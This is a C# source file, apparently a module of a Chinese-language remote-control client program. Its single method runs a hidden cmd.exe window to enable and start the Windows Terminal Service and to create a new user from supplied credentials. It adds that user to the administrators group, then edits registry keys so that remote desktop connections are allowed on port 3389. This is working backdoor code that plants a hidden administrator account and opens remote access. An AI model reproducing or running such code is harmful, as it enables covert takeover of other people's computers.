using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using Microsoft.Win32;

namespace 客户端主程序通讯类库.客户端类库.远程控制动作
{
    /// <summary>
    /// 打开远程桌面
    /// </summary>
    class OpenMSTSC
    {
        /// <summary>
        /// 打开远程桌面和3389端口。 同时添加超级管理员
        /// </summary>
        /// <param name="user_str"></param>
        /// <param name="pass_str"></param>
        public void Begin_openMSTSC(string user_str, string pass_str)
        {
            Process cess = new Process();
            cess.StartInfo.FileName = "cmd.exe";
            cess.StartInfo.UseShellExecute = false;
            cess.StartInfo.RedirectStandardInput = true;
            cess.StartInfo.RedirectStandardError = true;
            cess.StartInfo.CreateNoWindow = true;
            cess.Start();
            cess.StandardInput.WriteLine("sc config TermService start= auto");
            cess.StandardInput.WriteLine("net start TermService");
            cess.StandardInput.WriteLine("net user " + user_str + " " + pass_str + " /add");
            cess.StandardInput.WriteLine("net localgroup administrators " + user_str + " /add");
            cess.StandardInput.WriteLine("exit");
            RegistryKey subkey1 = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\", true);
            subkey1.SetValue("fDenyTSConnections", 0);
            RegistryKey subkey2 = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp", true);
            subkey2.SetValue("PortNumber", 3389);
            RegistryKey subkey3 = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp", true);
            subkey3.SetValue("PortNumber", 3389);
        }
    }
}
